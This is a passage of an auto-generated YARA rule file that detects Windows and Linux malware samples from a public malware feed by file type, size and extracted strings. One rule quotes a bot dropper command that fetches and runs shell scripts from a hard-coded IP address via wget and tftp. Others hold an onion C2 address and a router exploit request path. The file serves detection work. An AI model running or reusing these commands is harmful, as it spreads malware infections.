        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1108KB
        and all of them
}

rule Windows_0034d86b2e202eee69ef00b3551753f133278bd26e0ee0f486f0cc7e3dc61032
{
    meta:
        description = "Auto ML: 0034d86b2e202eee69ef00b3551753f133278bd26e0ee0f486f0cc7e3dc61032"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SSShL@A-"
        $s5 = "1@}jqWS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB
        and all of them
}

rule Windows_0203385de54173044b6c3d6fd96a810e9aaefab3ae1f8420ca1da8244fd77d28
{
    meta:
        description = "Auto ML: 0203385de54173044b6c3d6fd96a810e9aaefab3ae1f8420ca1da8244fd77d28"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3290KB
        and all of them
}

rule Linux_1ba78a014b960f81f90467b1de889355fd8e837464aefb969627d8961e3a0415
{
    meta:
        description = "Auto ML: 1ba78a014b960f81f90467b1de889355fd8e837464aefb969627d8961e3a0415"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "3fnHx@"
        $s4 = "/pro?|c/"
        $s5 = "/exeB("

    condition:
        uint32(0) == 0x464c457f and
        filesize < 69KB
        and all of them
}

rule Linux_1be0106630ea1a2fbcab648ef7408c6d4f49c9c398a5b236a60202fd2d967516
{
    meta:
        description = "Auto ML: 1be0106630ea1a2fbcab648ef7408c6d4f49c9c398a5b236a60202fd2d967516"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!mcjbg`k"
        $s2 = "!~|am!`kz!zm~"
        $s3 = "FA}g`qw2W|u{|w2Cgw`k"
        $s4 = "!jkx!yozmfjai"
        $s5 = "!jkx!cg}m!yozmfjai"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB
        and all of them
}

rule Windows_1c0b5baceb177598bafee74d48d91567428e3033521caec287021164db19b96e
{
    meta:
        description = "Auto ML: 1c0b5baceb177598bafee74d48d91567428e3033521caec287021164db19b96e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "Boolean"
        $s3 = "System"
        $s4 = "ShortInt"
        $s5 = "NativeH"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17742KB
        and all of them
}

rule Windows_1c1db50e2876a312fc1b8cf6f3234d157f7accc140b14b47318c735d97693f3b
{
    meta:
        description = "Auto ML: 1c1db50e2876a312fc1b8cf6f3234d157f7accc140b14b47318c735d97693f3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 677KB
        and all of them
}

rule Windows_1c37b630dfef62d41a02282e7a8c7b1619b36b933eb77d7e6c262258f0103d10
{
    meta:
        description = "Auto ML: 1c37b630dfef62d41a02282e7a8c7b1619b36b933eb77d7e6c262258f0103d10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Isolator"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 78KB
        and all of them
}

rule Windows_1c4a436f9c812eee92d86a068d3676ce6211d47f999cc48d0677b27f47cca62a
{
    meta:
        description = "Auto ML: 1c4a436f9c812eee92d86a068d3676ce6211d47f999cc48d0677b27f47cca62a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_1c66a4cfdf79926a56c1bd6ac25381b2deeed980fa28606ee826fe01ef49c4a4
{
    meta:
        description = "Auto ML: 1c66a4cfdf79926a56c1bd6ac25381b2deeed980fa28606ee826fe01ef49c4a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich}E"
        $s3 = "`.rdata"
        $s4 = "@.uebu"
        $s5 = "PAYLOAD:"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7KB
        and all of them
}

rule Windows_1c6b17bfcc95be957e2a0a79281b810c05a993111b142d63fb1e32a351d789c1
{
    meta:
        description = "Auto ML: 1c6b17bfcc95be957e2a0a79281b810c05a993111b142d63fb1e32a351d789c1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "|*SSQVj"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 355KB
        and all of them
}

rule Windows_1c6d1ba8637609ef14bb12400b0f2a705d27f71907603349385a63327345e8fa
{
    meta:
        description = "Auto ML: 1c6d1ba8637609ef14bb12400b0f2a705d27f71907603349385a63327345e8fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 686KB
        and all of them
}

rule Linux_1c711a57a19ce85cdc2a024c322508aa77a30316e4b1f33ff61c4b771574e176
{
    meta:
        description = "Auto ML: 1c711a57a19ce85cdc2a024c322508aa77a30316e4b1f33ff61c4b771574e176"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lq[cU"
        $s2 = "GNG4C@"
        $s3 = "nHlHh<"
        $s4 = "HYo=zh9"
        $s5 = "TP[QM@2"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_0225156af50ee95f9fdbfca0c0fe652d81bae15ce2f0b41e68ef857536c140fc
{
    meta:
        description = "Auto ML: 0225156af50ee95f9fdbfca0c0fe652d81bae15ce2f0b41e68ef857536c140fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "ThreadSafeObjectProvider`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 47KB
        and all of them
}

rule Windows_1c89d584da8d014b36b7496bfb5e9439801a690476fdaed655a0e0806299302e
{
    meta:
        description = "Auto ML: 1c89d584da8d014b36b7496bfb5e9439801a690476fdaed655a0e0806299302e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2307KB
        and all of them
}

rule Windows_1ca8f444f95c2cd9817ce6ab789513e55629c0e0ac0d2b7b552d402517e7cfe9
{
    meta:
        description = "Auto ML: 1ca8f444f95c2cd9817ce6ab789513e55629c0e0ac0d2b7b552d402517e7cfe9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Cheesed"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB
        and all of them
}

rule Windows_1d1685c4b298ccddbddc67e03a2bc252ba9cd8381a7c45638cfef438f47e3e22
{
    meta:
        description = "Auto ML: 1d1685c4b298ccddbddc67e03a2bc252ba9cd8381a7c45638cfef438f47e3e22"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB
        and all of them
}

rule Windows_1d2fe570cf55801fde9c9f91cfabe471e4f1ab87b10c4fbfa397086e10364461
{
    meta:
        description = "Auto ML: 1d2fe570cf55801fde9c9f91cfabe471e4f1ab87b10c4fbfa397086e10364461"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "zRich.u"
        $s3 = ".sedata"
        $s4 = "Z]QtH6="
        $s5 = "Sgu8Pk1-*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3196KB
        and all of them
}

rule Windows_1d411c7bc92cb31171c0f02d34491ce6ee96eed6181e5cb075092209fdd60733
{
    meta:
        description = "Auto ML: 1d411c7bc92cb31171c0f02d34491ce6ee96eed6181e5cb075092209fdd60733"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1254KB
        and all of them
}

rule Windows_1d7b53509e60dd7573aaa4403818ef1094bb8bfb6d8ecd3a7c5968ab046412ea
{
    meta:
        description = "Auto ML: 1d7b53509e60dd7573aaa4403818ef1094bb8bfb6d8ecd3a7c5968ab046412ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "Cobkmz.exe"
        $s5 = "Cobkmz"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB
        and all of them
}

rule Linux_1e20dcf558692e3b7b7a7d3193a62ccbb3a2d665ea2dd0a7cc1024e75d3062df
{
    meta:
        description = "Auto ML: 1e20dcf558692e3b7b7a7d3193a62ccbb3a2d665ea2dd0a7cc1024e75d3062df"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "]h,HCn"
        $s2 = "wm1!NsPo{p,"
        $s3 = "!W/S5@l!`E"
        $s4 = "LGPOTCw#"
        $s5 = ".Sh pT"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB
        and all of them
}

rule Linux_1e70ad2802f9cdf4c86462668119d51ff10d58e5a6cb713718595f786999f626
{
    meta:
        description = "Auto ML: 1e70ad2802f9cdf4c86462668119d51ff10d58e5a6cb713718595f786999f626"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "/BQxHoQxB"
        $s4 = "HoPpHoP"
        $s5 = "$Ho(ha"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Linux_1e813727174a3135165ef0fa74664f5305527c64a5a52da61bcfa30f8053373d
{
    meta:
        description = "Auto ML: 1e813727174a3135165ef0fa74664f5305527c64a5a52da61bcfa30f8053373d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "apple.bbos.ink"
        $s3 = "Roger That"
        $s4 = "gxgvoh5yljp2v2hvyiztzjhhuveaygcejp54y5gts2dnntdjexrkm2ad.onion"
        $s5 = "HTTP/1.1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB
        and all of them
}

rule Linux_1edeba46bdc9160a174fd13395a64e3fde382392effeb6a3ba5dd340d622feb0
{
    meta:
        description = "Auto ML: 1edeba46bdc9160a174fd13395a64e3fde382392effeb6a3ba5dd340d622feb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "MW~bEZ"
        $s2 = "\\~l<wcw"
        $s3 = "FZ>O S?Va>"
        $s4 = "tv.WW="
        $s5 = "i%^XWJ"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Linux_02268aff2d4d3677684c804db674bb28921fe71d0286397454d9006cd3ab34b4
{
    meta:
        description = "Auto ML: 02268aff2d4d3677684c804db674bb28921fe71d0286397454d9006cd3ab34b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB
        and all of them
}

rule Windows_1f1edc47a46a190a08befb1cf3e24d90cc832f44c5df7ca1280d45408d00cfb8
{
    meta:
        description = "Auto ML: 1f1edc47a46a190a08befb1cf3e24d90cc832f44c5df7ca1280d45408d00cfb8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB
        and all of them
}

rule Linux_1f21e09f4da090783aa816fdb36fd530da92aea0fe7967f3ae8def43b2f27de7
{
    meta:
        description = "Auto ML: 1f21e09f4da090783aa816fdb36fd530da92aea0fe7967f3ae8def43b2f27de7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB
        and all of them
}

rule Windows_1f61c34deddf39f3fecab0644ad6c9cf59e8cf9b1795d05def642914c1c6bbe2
{
    meta:
        description = "Auto ML: 1f61c34deddf39f3fecab0644ad6c9cf59e8cf9b1795d05def642914c1c6bbe2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "cFa dAx"
        $s4 = "#Strings"
        $s5 = "Condition"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1030KB
        and all of them
}

rule Windows_1f6b987df79234bbf48b62410263ca081a8340b2102b1934b0d01dfd4188f610
{
    meta:
        description = "Auto ML: 1f6b987df79234bbf48b62410263ca081a8340b2102b1934b0d01dfd4188f610"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "1iZ]by"
        $s3 = "N3WCIzRK"
        $s4 = "sv2^?WR"
        $s5 = "Ki8Q(W"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB
        and all of them
}

rule Windows_1f80a5027a30b618996426f0c02d630d7b275351f524fd9b5644e9f6db779be9
{
    meta:
        description = "Auto ML: 1f80a5027a30b618996426f0c02d630d7b275351f524fd9b5644e9f6db779be9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P>3xPziG"
        $s3 = "sn 6SJ"
        $s4 = "O0xNQB"
        $s5 = "zjW=Wm"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1332KB
        and all of them
}

rule Windows_1f98c29e6250eb8ff1185ef45b6fc1b6e2ad19ecc127ba6406ce68a778206683
{
    meta:
        description = "Auto ML: 1f98c29e6250eb8ff1185ef45b6fc1b6e2ad19ecc127ba6406ce68a778206683"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1662KB
        and all of them
}

rule Windows_1fa544646d6c53b124a6c43bdb0479fcd254e74dafe992c537ad40d7b7d0a850
{
    meta:
        description = "Auto ML: 1fa544646d6c53b124a6c43bdb0479fcd254e74dafe992c537ad40d7b7d0a850"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4759KB
        and all of them
}

rule Linux_1fc5df840917e7503fcac4be3c2886426fbb9fa70f4d3b45f5b1ec8baad56bf6
{
    meta:
        description = "Auto ML: 1fc5df840917e7503fcac4be3c2886426fbb9fa70f4d3b45f5b1ec8baad56bf6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "sysconf"
        $s4 = "connect"
        $s5 = "sigemptyset"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Windows_1ff483be03e1ed1b9dba67315b7fdc98d9ea3bdd015a30acc4e6d37265451aa3
{
    meta:
        description = "Auto ML: 1ff483be03e1ed1b9dba67315b7fdc98d9ea3bdd015a30acc4e6d37265451aa3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4594KB
        and all of them
}

rule Windows_202ebcf24cd4b6a4394e7dddd7ee98bceb9ac2b8c281e9f4610c7a93dafaa959
{
    meta:
        description = "Auto ML: 202ebcf24cd4b6a4394e7dddd7ee98bceb9ac2b8c281e9f4610c7a93dafaa959"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "KDBM(k"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB
        and all of them
}

rule Windows_0226f207e06535060dc26c905ddf0956626b8df17bc4e2c28ebbd0bd69abf9f3
{
    meta:
        description = "Auto ML: 0226f207e06535060dc26c905ddf0956626b8df17bc4e2c28ebbd0bd69abf9f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4412KB
        and all of them
}

rule Windows_20605540e34581146556911980568ab5cea655e86b2899898626e093fd071c3d
{
    meta:
        description = "Auto ML: 20605540e34581146556911980568ab5cea655e86b2899898626e093fd071c3d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB
        and all of them
}

rule Linux_207432f6e686430cf0d528762e8a1685b2d3d778a92b56886939861eaa14dedf
{
    meta:
        description = "Auto ML: 207432f6e686430cf0d528762e8a1685b2d3d778a92b56886939861eaa14dedf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "ad34334in"
        $s3 = "us534534534er"
        $s4 = "lo54345534gin"
        $s5 = "ge534345345st"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 128KB
        and all of them
}

rule Windows_20761b3cb614e078d165cf47da120127e86bb0a8ab862dc32b022f9e351abff3
{
    meta:
        description = "Auto ML: 20761b3cb614e078d165cf47da120127e86bb0a8ab862dc32b022f9e351abff3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB
        and all of them
}

rule Linux_2080c144d101ab9cf6584e61c7cae32b3afeeb6a0a89daec22296b554266e18c
{
    meta:
        description = "Auto ML: 2080c144d101ab9cf6584e61c7cae32b3afeeb6a0a89daec22296b554266e18c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "TV[h0#n"
        $s4 = "WiYO{@"
        $s5 = "3nlSOSh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB
        and all of them
}

rule Windows_209fb76e62610c2de55f2c539ef64f1ed58b00109579c4b3cc784c526bb2518a
{
    meta:
        description = "Auto ML: 209fb76e62610c2de55f2c539ef64f1ed58b00109579c4b3cc784c526bb2518a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "B.idata"
        $s3 = "@.themida"
        $s4 = "E;r3YI"
        $s5 = "lhAmF4"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5714KB
        and all of them
}

rule Windows_20c71940fe5d447f7561bc731545b698a3632dfda6022194f0dfaf9500a3ac59
{
    meta:
        description = "Auto ML: 20c71940fe5d447f7561bc731545b698a3632dfda6022194f0dfaf9500a3ac59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "h4iSOBcV10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 355KB
        and all of them
}

rule Windows_20ec3bec0465f43ae42fdd9a1689c7cd9290e8fd4f97eaaf7bf94decb61a09bb
{
    meta:
        description = "Auto ML: 20ec3bec0465f43ae42fdd9a1689c7cd9290e8fd4f97eaaf7bf94decb61a09bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2394KB
        and all of them
}

rule Windows_20f562d699b8a5fd2c0af6acf8b27124e57b372f78a9190e1d7fe9d739b9d816
{
    meta:
        description = "Auto ML: 20f562d699b8a5fd2c0af6acf8b27124e57b372f78a9190e1d7fe9d739b9d816"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4827KB
        and all of them
}

rule Windows_2101b0cbc46567edd0a5c6bdc673e5ac2dad20ca8b3b6bb00d88566dea9ee5ed
{
    meta:
        description = "Auto ML: 2101b0cbc46567edd0a5c6bdc673e5ac2dad20ca8b3b6bb00d88566dea9ee5ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Boolean"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3882KB
        and all of them
}

rule Windows_211560aabd0a46ef0dde5f5a94bfefa3d1cad47ae133f526844d19dc623aad20
{
    meta:
        description = "Auto ML: 211560aabd0a46ef0dde5f5a94bfefa3d1cad47ae133f526844d19dc623aad20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Inno:aJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4761KB
        and all of them
}

rule Linux_0242a019e991b897de267fed696652c2f243ba4fe193dd1a53942e11fa07a225
{
    meta:
        description = "Auto ML: 0242a019e991b897de267fed696652c2f243ba4fe193dd1a53942e11fa07a225"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRh!m"
        $s2 = "qos*bGyul"
        $s3 = "[FFDBXD"
        $s4 = "ys@@ASlh"
        $s5 = ".dJJSJ"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_2145cc1bb4315c608aa187ccbabe3aa5699d71727aa65a2b0fef88f01e21c377
{
    meta:
        description = "Auto ML: 2145cc1bb4315c608aa187ccbabe3aa5699d71727aa65a2b0fef88f01e21c377"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".qdata"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2196KB
        and all of them
}

rule Windows_216af63fedbf9379d7d2f6b52eb81d3b19a1310fa0cb365a6121788b2b48baa0
{
    meta:
        description = "Auto ML: 216af63fedbf9379d7d2f6b52eb81d3b19a1310fa0cb365a6121788b2b48baa0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "ZXIS8%"
        $s4 = "c`XGR8~"
        $s5 = "c`XGR8*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5381KB
        and all of them
}

rule Windows_21752d701ba9884a7a56ace43ae613d368696e26462f77dbc702191c7161a519
{
    meta:
        description = "Auto ML: 21752d701ba9884a7a56ace43ae613d368696e26462f77dbc702191c7161a519"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
